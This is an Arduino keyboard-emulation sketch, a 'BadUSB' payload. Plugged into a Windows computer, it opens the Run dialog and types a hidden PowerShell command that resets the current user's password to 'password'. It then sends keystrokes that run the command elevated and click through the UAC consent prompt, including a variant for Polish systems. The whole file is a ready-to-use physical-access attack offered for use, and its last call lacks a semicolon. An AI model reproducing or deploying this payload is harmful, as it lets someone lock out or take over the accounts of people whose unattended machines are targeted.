#include <Keyboard.h>

void setup() {
  // Initialize the USB keyboard emulation
  Keyboard.begin();
  delay(1500);  // Delay to allow time for the keyboard to initialize

  // Simulate pressing the Windows key and 'r' key simultaneously
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  delay(2000);  // Delay 2 seconds

  // Type the PowerShell command, change the admin password to "password". Change it if needed.
  Keyboard.print("powershell /w 1 /C net user $env:USERNAME password");

  delay(1000);  // Delay 1 second

  // Simulate Ctrl + Shift + Enter
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(2000);  // Delay 2 seconds

  // Simulate Alt + Y
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.press('t'); //For polish OS
  delay(100);
  Keyboard.releaseAll();
  
  delay(300);
  Keyboard.end()
}

void loop() {
  // Empty loop
}
